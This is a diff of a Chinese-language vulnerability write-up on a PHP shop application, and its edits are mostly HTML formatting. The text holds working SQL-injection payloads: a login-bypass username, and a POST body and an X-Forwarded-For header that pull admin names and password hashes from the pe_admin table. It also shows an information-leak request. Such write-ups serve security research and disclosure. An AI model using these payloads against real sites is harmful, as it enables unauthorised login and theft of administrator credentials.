@@ -13,7 +13,7 @@ case 'login':
 ```
 
 亮點在這裡`if ($info = $db->pe_select('user', $_p_info)) {`，只要$info不為空就成功登入了。
-<br >
+<p>
 簡單來一發萬能密碼,用戶名：`' or 1=1-- -`，密碼隨意就ok了
 
 
@@ -49,7 +49,8 @@ case 'base':
     include(pe_tpl('user_base.html'));
 ```
 
-亮點在`if ($db->pe_update('user', array('user_id'=>$_s_user_id), pe_dbhold($_p_info))) {`。<br>
+亮點在`if ($db->pe_update('user', array('user_id'=>$_s_user_id), pe_dbhold($_p_info))) {`。
+<p>
 我們跟進`pe_dbhold()`函數
 
 ```php
@@ -86,11 +87,13 @@ public function pe_update($table, $where, $set)
 }
 ```
 
-同 **【Bug 0x06】**一樣，經過`_dowhere()`處理、一樣可以對其進行注入。
+### **【Bug 0x06】** 一樣，經過`_dowhere()`處理、一樣可以對其進行注入。
+
 ```【Bug 0x09: SQL注入 獲取任意資料庫數據】```
+<p>
 URL:
 ```/index.php?mod=user&act=base```
-
+<p>
 DATA:
 ```info%5Buser_address`%3D(select concat(0x7e,admin_name,0x7e,admin_pw,0x7e) from pe_admin limit 1) , `user_tname%5D=1```
 
@@ -115,9 +118,11 @@ case 'askadd':
 
 ## **【Bug 0x10: 訊息洩漏 Warning】**
 POST:
+<p>
 ```/index.php?mod=product&act=askadd&id=1```
 <br>
 DATA:
+<p>
 ```ask_text[]=asfasdfasfs&pesubmit=true```
 <br>
 
@@ -147,12 +152,13 @@ function pe_ip()
 ### **【Bug 0x11: SQL注入 獲取任意資料庫數據】**
 POST:
 <br>
-```/index.php?mod=product&act=askadd&id=1```
+<pre>/index.php?mod=product&act=askadd&id=1</pre>
+<p>
 x-forwarded-for:
-<br>
-```1', `ask_replytext` = (select concat(0x7e,admin_name,0x7e,admin_pw,0x7e)  from pe_admin limit 1)#```
-
-返回的訊息在商品、賣家回覆裏。
+<pre>
+```1', `ask_replytext` = (select concat(0x7e,admin_name,0x7e,admin_pw,0x7e)  from pe_admin limit 1)#
+</pre>
+返回的訊息在商品、賣家回覆裡。
 <br >
 再往下看，在`商品列表`操作中、又是一個大大的BUG出現了。
 
